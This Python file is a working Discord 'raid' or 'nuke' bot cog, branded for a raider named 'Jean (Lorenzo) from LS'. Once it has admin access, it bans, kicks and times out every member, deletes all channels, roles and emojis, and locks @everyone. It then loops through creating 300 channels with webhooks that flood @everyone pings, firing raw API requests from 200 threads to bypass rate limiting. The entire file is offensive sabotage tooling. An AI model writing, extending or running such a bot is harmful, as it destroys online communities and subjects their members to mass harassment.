"""
raid.py — LAST STAND | Jean (Lorenzo) destruction engine.

Architecture (c2v port):
  200 daemon threads pull from an unbounded Queue and fire raw HTTP requests
  directly to Discord REST API — bypassing discord.py rate limit buckets.
  The asyncio event loop stays nearly idle so /stop always responds instantly.

PHASES (all concurrent):
  _rename_server   — rename server + lock @everyone
  _wipe_emojis     — DELETE all custom emojis via queue
  _channel_loop    — delete all → rebuild 300 channels → webhook spam → repeat
  _role_flood      — POST 200 raid roles via queue
  _member_ops      — kick + ban + timeout every member via queue (runs FIRST)
"""

import asyncio
import datetime
import random

import discord
import requests
from discord import app_commands
from discord.ext import commands

from utils.http_queue import HttpQueue, API_BASE
from utils.state import bot_state

RAID_TAG         = "Jean (Lorenzo) | LS"
RAID_NAME        = "RAIDED BY JEAN (LORENZO) FROM LS"
RAIDER           = "Jean Lorenzo"
CREATE_PER_CYCLE = 300
WEBHOOKS_PER_CH  = 3
NUKE_LOOP_WAIT   = 45
_WH_CREATE_SEM   = asyncio.Semaphore(20)

_MSGS = [
    f"@everyone 💀 **{RAID_NAME}** 💀",
    f"@everyone ☠️ Raided by {RAIDER} from Last Stand ☠️",
    f"@everyone 🔥 YOUR SERVER IS BEING RAIDED BY {RAIDER} FROM LS 🔥",
    f"@everyone ⚔️ {RAID_NAME} ⚔️",
    f"@everyone 💥 DESTROYED BY {RAIDER} | LAST STAND 💥",
    f"@everyone 👑 {RAIDER} FROM LS OWNS THIS SERVER",
    f"@here 💀 {RAID_NAME}",
    f"@here ☠️ {RAIDER} | LAST STAND RAID IN PROGRESS",
    f"@here 🎯 RAIDED BY JEAN (LORENZO) FROM LS",
]

_WH_NAMES = [
    "Jean Lorenzo", "Last Stand", "LS Raid", "Jean LS",
    "Server Alert", "AutoMod", "LS Bot",
]

_ROLE_NAMES = [
    "☠️ RAIDED BY JEAN LS", "💀 LAST STAND", "🔥 JEAN LORENZO RAIDED",
    "⚔️ LS OWNS YOU", "💥 RAIDED BY LS", "👑 JEAN WAS HERE",
    "🚨 LAST STAND RAIDED", "⚠️ SERVER COMPROMISED BY LS",
    "🔴 LS RAID", "💣 Jean (Lorenzo) | LS",
]

_NICKS = ["RAIDED BY JEAN", "LS RAIDED", "Jean Lorenzo", "LAST STAND"]

_CH_NAMES = [
    "jean-lorenzo-raided",
    "ls-raided",
    "raided-by-jean",
    "last-stand-raided",
    "jean-from-ls",
    "ls-was-here",
]

_ROLE_COLORS = [
    0xFF0000, 0x8B0000, 0xFF6600, 0xFF4500,
    0x800080, 0x4B0082, 0xFF1493, 0xDC143C,
]


def _ch_name() -> str:
    return random.choice(_CH_NAMES)


def _msg() -> str:
    return random.choice(_MSGS)


class Raid(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    # ── shared launch ──────────────────────────────────────────────────────────
    async def _launch(
        self,
        guild: discord.Guild,
        invoker_id: int,
        reply,
        hub_id: int | None = None,
    ) -> None:
        if bot_state.active_simulation:
            await reply(f"⚠️ **{bot_state.active_simulation}** is running — use `.stop` or `/stop` first.")
            return

        if not guild.me.guild_permissions.administrator and not guild.me.guild_permissions.manage_channels:
            await reply("❌ Missing **Administrator** — run `/testperms`.")
            return

        bot_state.reset()
        bot_state.active_simulation = "raid"

        protected_ids: set[int] = {hub_id} if hub_id else set()

        try:
            await reply(
                f"☠️ **{RAID_TAG} — RAID LAUNCHED** ☠️\n"
                f"┣ BAN + KICK + TIMEOUT all members immediately\n"
                f"┣ DELETE all channels + roles + emojis\n"
                f"┣ REBUILD {CREATE_PER_CYCLE} flood channels × {WEBHOOKS_PER_CH} webhooks\n"
                f"┣ SPAM — @everyone pings — loops non-stop\n"
                f"┗ `/stop` or `.stop` to halt."
            )
        except Exception:
            pass

        # Member ops first — remove members before they can react
        bot_state.add_task(asyncio.create_task(self._member_ops(guild, invoker_id)))
        bot_state.add_task(asyncio.create_task(self._rename_server(guild)))
        bot_state.add_task(asyncio.create_task(self._wipe_emojis(guild)))
        bot_state.add_task(asyncio.create_task(self._channel_loop(guild, protected_ids)))
        bot_state.add_task(asyncio.create_task(self._role_flood(guild)))

    # ── /raid ──────────────────────────────────────────────────────────────────
    @app_commands.command(name="raid", description=f"☠️ Full raid — {RAID_TAG}. Runs until /stop.")
    @app_commands.guild_only()
    async def raid(self, interaction: discord.Interaction) -> None:
        await interaction.response.send_message(
            "☠️ **RAID LAUNCHED** — raiding by Jean (Lorenzo) from LS...", ephemeral=True
        )

        guild: discord.Guild             = interaction.guild
        hub:   discord.TextChannel | None = None
        hub_id: int | None                = None

        try:
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False, send_messages=False),
                guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            }
            hub = await asyncio.wait_for(
                guild.create_text_channel("ls-control", overwrites=overwrites),
                timeout=10.0,
            )
            hub_id = hub.id
            print(f"[raid] control hub created: #{hub.id}", flush=True)
        except Exception as e:
            print(f"[raid] hub creation failed: {e}", flush=True)

        reply = hub.send if hub else interaction.followup.send
        await self._launch(guild, interaction.user.id, reply, hub_id=hub_id)

    # ── .raid ──────────────────────────────────────────────────────────────────
    @commands.command(name="raid")
    @commands.guild_only()
    async def raid_prefix(self, ctx: commands.Context) -> None:
        await ctx.send("☠️ RAID LAUNCHED — raiding by Jean (Lorenzo) from LS...")
        await self._launch(ctx.guild, ctx.author.id, ctx.send)

    # ─────────────────────────────────────────────────────────────────────────
    # RENAME + LOCK
    # ─────────────────────────────────────────────────────────────────────────
    async def _rename_server(self, guild: discord.Guild) -> None:
        try:
            await guild.edit(name=RAID_NAME)
            print("[raid] server renamed OK", flush=True)
        except Exception as e:
            print(f"[raid] rename FAILED: {e}", flush=True)
        try:
            await guild.default_role.edit(permissions=discord.Permissions.none())
            print("[raid] @everyone locked OK", flush=True)
        except Exception as e:
            print(f"[raid] lock @everyone FAILED: {e}", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # EMOJI WIPE
    # ─────────────────────────────────────────────────────────────────────────
    async def _wipe_emojis(self, guild: discord.Guild) -> None:
        q      = HttpQueue.get()
        emojis = list(guild.emojis)
        if not emojis:
            return
        for e in emojis:
            q.put(requests.delete, f"{API_BASE}/guilds/{guild.id}/emojis/{e.id}")
        await q.join()
        print(f"[raid] wiped {len(emojis)} emojis", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # WEBHOOK SPAM FEEDER
    # ─────────────────────────────────────────────────────────────────────────
    async def _webhook_spam_feeder(self, webhook_urls: list[str]) -> None:
        q        = HttpQueue.get()
        se       = bot_state.stop_event
        mentions = {"parse": ["everyone", "roles"]}
        try:
            while not se.is_set():
                for url in webhook_urls:
                    if se.is_set():
                        return
                    q.put_webhook(url, {
                        "content": _msg(),
                        "username": random.choice(_WH_NAMES),
                        "allowed_mentions": mentions,
                    })
                await asyncio.sleep(0)
        except asyncio.CancelledError:
            pass

    # ─────────────────────────────────────────────────────────────────────────
    # CHANNEL SPAM FEEDER
    # ─────────────────────────────────────────────────────────────────────────
    async def _channel_spam_feeder(self, channel_ids: list[int]) -> None:
        q  = HttpQueue.get()
        se = bot_state.stop_event
        try:
            while not se.is_set():
                for ch_id in channel_ids:
                    if se.is_set():
                        return
                    q.put(
                        requests.post,
                        f"{API_BASE}/channels/{ch_id}/messages",
                        {
                            "content": _msg(),
                            "allowed_mentions": {"parse": ["everyone", "roles"]},
                        },
                    )
                await asyncio.sleep(0)
        except asyncio.CancelledError:
            pass

    # ─────────────────────────────────────────────────────────────────────────
    # CONTINUOUS NUKE LOOP
    # Spam starts on the FIRST created channel — no waiting for all 300.
    # Shared mutable lists grow as channels/webhooks are created; feeders
    # pick up new entries every loop iteration automatically.
    # ─────────────────────────────────────────────────────────────────────────
    async def _channel_loop(
        self,
        guild: discord.Guild,
        protected_ids: set[int] | None = None,
    ) -> None:
        se         = bot_state.stop_event
        q          = HttpQueue.get()
        _protected = protected_ids or set()
        cycle      = 0

        try:
            while not se.is_set():
                cycle += 1
                print(f"[nuke] ── cycle {cycle} start ──", flush=True)

                # ── Phase A: DELETE all unprotected channels ───────────────
                existing = [ch for ch in guild.channels if ch.id not in _protected]
                print(f"[nuke] queuing {len(existing)} deletes", flush=True)
                for ch in existing:
                    q.put(requests.delete, f"{API_BASE}/channels/{ch.id}")

                delete_wait = max(5.0, len(existing) * 0.12)
                await asyncio.sleep(delete_wait)
                if se.is_set():
                    return
                await asyncio.sleep(2.0)

                # ── Phase B+C+D: Create channels + webhooks + START SPAM ──
                # Shared mutable lists — feeders iterate these every loop tick.
                channel_ids:  list[int] = []
                webhook_urls: list[str] = []

                # Feeders launch immediately; they spin harmlessly on empty
                # lists and pick up entries the moment they're appended.
                t_ch = asyncio.create_task(self._channel_spam_feeder(channel_ids))
                t_wh = asyncio.create_task(self._webhook_spam_feeder(webhook_urls))
                bot_state.add_task(t_ch)
                bot_state.add_task(t_wh)
                spam_tasks = [t_ch, t_wh]

                # Semaphore only gates CHANNEL creation (2/sec Discord limit).
                # Webhook creation runs OUTSIDE it so the slot is freed fast.
                _create_sem = asyncio.Semaphore(2)

                async def _create_one() -> None:
                    if se.is_set():
                        return
                    ch = None
                    # ── Step 1: create channel (hold semaphore only here) ──
                    async with _create_sem:
                        if se.is_set():
                            return
                        try:
                            ch = await asyncio.wait_for(
                                guild.create_text_channel(
                                    _ch_name(),
                                    topic="Raided by Jean (Lorenzo) from LS",
                                ),
                                timeout=15.0,
                            )
                        except Exception as e:
                            print(f"[nuke] create failed: {e}", flush=True)
                            return
                    # Semaphore released — next channel can start immediately
                    channel_ids.append(ch.id)

                    # ── Step 2: create webhooks concurrently (no channel sem) ─
                    for _ in range(WEBHOOKS_PER_CH):
                        if se.is_set():
                            return
                        async with _WH_CREATE_SEM:
                            try:
                                wh = await asyncio.wait_for(
                                    ch.create_webhook(name=random.choice(_WH_NAMES)),
                                    timeout=10.0,
                                )
                                webhook_urls.append(wh.url)
                            except Exception:
                                pass

                print(f"[nuke] creating {CREATE_PER_CYCLE} channels...", flush=True)
                await asyncio.gather(
                    *[_create_one() for _ in range(CREATE_PER_CYCLE)],
                    return_exceptions=True,
                )
                print(
                    f"[nuke] cycle {cycle} done — {len(channel_ids)} channels, "
                    f"{len(webhook_urls)} webhooks, spam running",
                    flush=True,
                )

                if se.is_set():
                    break

                # ── Phase E: WAIT then loop ───────────────────────────────
                for _ in range(NUKE_LOOP_WAIT * 10):
                    if se.is_set():
                        break
                    await asyncio.sleep(0.1)

                for t in spam_tasks:
                    t.cancel()
                await asyncio.gather(*spam_tasks, return_exceptions=True)

                print(f"[nuke] cycle {cycle} complete — looping", flush=True)

        except asyncio.CancelledError:
            q.clear()
            print("[nuke] channel_loop cancelled", flush=True)
        except Exception as e:
            print(f"[nuke] channel_loop CRASH: {type(e).__name__}: {e}", flush=True)
        finally:
            print("[nuke] channel_loop exiting", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # ROLE FLOOD
    # ─────────────────────────────────────────────────────────────────────────
    async def _role_flood(self, guild: discord.Guild) -> None:
        q  = HttpQueue.get()
        se = bot_state.stop_event
        for i in range(200):
            if se.is_set():
                break
            q.put(
                requests.post,
                f"{API_BASE}/guilds/{guild.id}/roles",
                {
                    "name": random.choice(_ROLE_NAMES),
                    "color": random.choice(_ROLE_COLORS),
                    "permissions": "0",
                },
            )
        if not se.is_set():
            await q.join()
        print("[role] role flood done", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # MEMBER OPS — kick + ban + timeout everyone at once via queue
    # ─────────────────────────────────────────────────────────────────────────
    async def _member_ops(self, guild: discord.Guild, invoker_id: int) -> None:
        se = bot_state.stop_event
        print("[raid] member_ops: chunking...", flush=True)
        try:
            await asyncio.wait_for(guild.chunk(cache=True), timeout=10.0)
        except Exception as e:
            print(f"[raid] chunk error: {e}", flush=True)

        if se.is_set():
            return

        me = guild.me
        targets = [
            m for m in guild.members
            if not m.bot
            and m.id != invoker_id
            and m.id != me.id
            and m.top_role < me.top_role
        ]
        print(f"[raid] queuing ops on {len(targets)} members", flush=True)

        q = HttpQueue.get()
        timeout_until = (
            datetime.datetime.utcnow() + datetime.timedelta(days=28)
        ).strftime("%Y-%m-%dT%H:%M:%S.000Z")

        for m in targets:
            if se.is_set():
                break
            # Kick first
            q.put(requests.delete, f"{API_BASE}/guilds/{guild.id}/members/{m.id}")
            # Ban
            q.put(
                requests.put,
                f"{API_BASE}/guilds/{guild.id}/bans/{m.id}",
                {"delete_message_days": 0},
            )
            # Timeout + nick
            q.put(
                requests.patch,
                f"{API_BASE}/guilds/{guild.id}/members/{m.id}",
                {
                    "communication_disabled_until": timeout_until,
                    "nick": random.choice(_NICKS),
                },
            )

        if not se.is_set():
            await q.join()
        print(f"[raid] member_ops done — processed {len(targets)} members", flush=True)

    # ── error handlers ─────────────────────────────────────────────────────────
    @raid.error
    async def raid_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
        msg = (
            "❌ You need **Administrator** permission."
            if isinstance(error, app_commands.MissingPermissions)
            else f"❌ {error}"
        )
        try:
            if interaction.response.is_done():
                await interaction.followup.send(msg, ephemeral=True)
            else:
                await interaction.response.send_message(msg, ephemeral=True)
        except Exception:
            pass


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Raid(bot))
